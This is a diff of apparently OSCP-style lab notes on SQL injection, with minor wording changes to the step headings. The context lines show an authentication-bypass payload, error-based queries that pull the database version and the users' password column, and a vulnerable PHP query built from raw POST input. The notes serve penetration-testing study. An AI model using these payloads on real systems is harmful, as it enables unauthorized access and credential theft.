@@ -1561,7 +1561,7 @@ uname= `offsec' OR 1=1 -- //`
 ```
 SELECT * FROM users WHERE user_name= 'offsec' OR 1=1 --
 ```
-1. Append a single quote to the username.
+1. Append a single quote to the username
 ![image](https://hackmd.io/_uploads/B1NEBE4Q1l.png)
     > SQL syntax error this time, meaning we can interact with the database.
 
@@ -1571,14 +1571,14 @@ SELECT * FROM users WHERE user_name= 'offsec' OR 1=1 --
     ![image](https://hackmd.io/_uploads/Bknx844Xkl.png)
     > received an Authentication Successful message, meaning that our attack succeeded
 
-2. Check version
+2. Check DB version
     ```
     ' or 1=1 in (select @@version) -- //
     ```          
     ![image](https://hackmd.io/_uploads/ryxGc4VQkg.png)
     > This means that we should **only query one column at a time**.
 
-3. Grab only the password column.
+3. Grab only the password column
     ```
     ' or 1=1 in (SELECT password FROM users) -- //
     ```
@@ -1602,4 +1602,3 @@ Vulnerable SQL Query
 ```php
 $query = "SELECT * from customers WHERE name LIKE '".$_POST["search_input"]."%'";
 ```
-
